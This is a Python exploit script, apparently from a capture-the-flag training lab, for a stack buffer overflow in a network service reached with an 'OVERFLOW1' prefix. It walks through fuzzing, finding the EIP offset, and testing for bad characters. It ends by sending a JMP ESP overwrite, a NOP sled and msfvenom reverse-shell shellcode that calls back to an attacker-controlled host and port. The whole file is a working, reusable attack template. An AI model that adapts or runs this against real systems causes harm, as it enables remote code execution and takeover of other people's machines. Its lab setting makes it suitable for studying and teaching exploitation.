#!/usr/bin/env python3
from struct import pack
import shlex
from time import sleep
from subprocess import check_output
import socket


VICTIM_IP = "10.10.219.129"
VICTIM_PORT = 1337

EIP_OFFSET = 1978
BAD_BYTES = b"\x00\x07\x2e\xa0"
JMP_ESP = 0x625011AF

LHOST = "10.6.38.182"
LPORT = 443


def send_payload(payload):
    """
    This is the core function to send your payloads.

    Change it for any new binary so that it properly interacts with the target
    network service.
    """
    addr = (VICTIM_IP, VICTIM_PORT)
    timeout = 2  # seconds
    prefix = b"OVERFLOW1 "
    payload = prefix + payload

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect(addr)
        s.recv(1024)
        print(f"[*] Sending {len(payload)} bytes to {VICTIM_IP}:{VICTIM_PORT}")
        s.send(payload)
        s.recv(1024)


def p32(val):
    """Pack a little endian 32-bit integer"""
    return pack("<I", val)


def hexbytes(raw_bytes):
    """Converts raw bytes to hex-escaped string"""
    return "".join(f"\\x{b:02x}" for b in raw_bytes)


def gen_bytes(bad_bytes=b"\x00"):
    """Generate sequence of all bytes, excluding known bad ones."""
    print(f"[*] Excluded bytes: {hexbytes(bad_bytes)}")
    return bytes(range(256)).translate(None, delete=bad_bytes)


def cyclic(length):
    """
    Create a cyclic pattern for finding offsets for shellcode.

    Relies on metasploit's pattern_create being installed on host.
    """
    return check_output(shlex.split(f"msf-pattern_create -l {length}"))[:length]
    # return check_output(shlex.split(f"ragg2 -rP {length}"))[:length]


def gen_shellcode(
    payload="windows/shell_reverse_tcp",
    arch="x86",
    platform="windows",
    encoder="x86/shikata_ga_nai",
    bad_bytes=b"\x00",
    options=None,  # dict of options to add to LHOST, LPORT.
    outfile="shellcode.bin",
):
    opts = {"LHOST": LHOST, "LPORT": LPORT}
    if options:
        opts = opts.update(options)
    options = shlex.join(f"{k}={v}" for k, v in opts.items())

    if isinstance(bad_bytes, bytes):
        bad_bytes = hexbytes(bad_bytes)

    cmd = shlex.split(
        "msfvenom -f raw "
        f"-p {payload} "
        f"-a {arch} "
        f"--platform {platform} "
        f"-e {encoder} "
        f"-b '{bad_bytes}' "
        f"{options}"
    )

    print(f"[*] Generating shellcode with command: '{shlex.join(cmd)}'")
    shellcode = check_output(cmd)

    with open(outfile, "wb") as f:
        f.write(shellcode)
    print(f"[*] Raw shellcode saved to '{outfile}'")

    return shellcode


def test_connection():
    addr = (VICTIM_IP, VICTIM_PORT)
    timeout = 2  # seconds
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect(addr)
    except (ConnectionRefusedError, socket.timeout):
        print("[x] Connection failed. Ensure IP:port correct and host is up")
        exit(1)


def cause_crash():
    """Fuzzes the target by sending string of As with length defined by cmdline
    arg."""
    test_connection()
    payloadlen = 64
    while True:
        payload = b"A" * payloadlen
        print(f"[*] Attempting to crash the service with {payloadlen}-byte payload")
        try:
            send_payload(payload)
        except socket.timeout:
            print(f"[+] Service crashed with payload length: {payloadlen}")
            return payloadlen
        payloadlen *= 2
        sleep(0.5)


def find_offset(size):
    test_connection()
    payload = cyclic(size)
    print(f"[*] Sending {size}-byte pattern to find EIP offset")
    send_payload(payload)


def confirm_offset():
    test_connection()
    padding = b"A" * EIP_OFFSET
    payload = padding
    payload += b"BBBB"
    payload += cyclic(256)
    print(f"[*] Confirming offset by setting EIP to 'BBBB' at offset {EIP_OFFSET}")
    send_payload(payload)


def find_bad_bytes():
    # To compare results, first generate baseline: (-b is bad bytes)
    #   !mona bytearray -b "\x00"
    # This should make a bytearray.bin file in your mona working dir
    # Then compare your memory at ESP with the baseline:
    #   !mona compare -f C:\mona\<target>\bytearray.bin -a <address>
    # Not all of these might be badchars! Sometimes badchars cause the next
    # byte to get corrupted as well, or even effect the rest of the string.
    # The first badchar in the list should be the null byte (\x00) since we
    # already removed it from the file. Make a note of any others. Generate a
    # new bytearray in mona, specifying these new badchars along with \x00.
    # Repeat the badchar comparison until the results status returns
    # "Unmodified". This indicates that no more badchars exist.
    test_connection()
    allowed = gen_bytes(bad_bytes=BAD_BYTES)
    padding = b"A" * EIP_OFFSET
    payload = padding
    payload += b"BBBB"
    payload += allowed
    try:
        send_payload(payload)
    except socket.timeout:
        print("[*] Now use these commands:")
        print(f'!mona bytearray -b "{hexbytes(BAD_BYTES)}"')
        print("!mona compare -f C:\\mona\\<target>\\bytearray.bin -a <esp-address>")


def do_exploit():
    # to find jmp_esp, use the following mona command: (-cpb avoids bad ptr bytes)
    #   !mona jmp -r esp -cpb '\x00...'
    test_connection()
    padding = b"A" * EIP_OFFSET
    nopsled = b"\x90" * 32

    payload = padding
    payload += p32(JMP_ESP)
    payload += nopsled
    payload += gen_shellcode(bad_bytes=BAD_BYTES)
    print("[*] Sending exploit payload. Hopefully you have a listener ready!")
    send_payload(payload)


if __name__ == "__main__":
    # This script is used in stages. Uncomment each function in turn, adjusting
    # global constants at top of file as necessary.
    # To make mona easier to work with, set a custom working folder:
    #   !mona config -set workingfolder c:\mona\%p

    # cause_crash()

    # find_offset(2048)

    # confirm_offset()

    # find_bad_bytes()

    do_exploit()

    print("[+] DONE!")
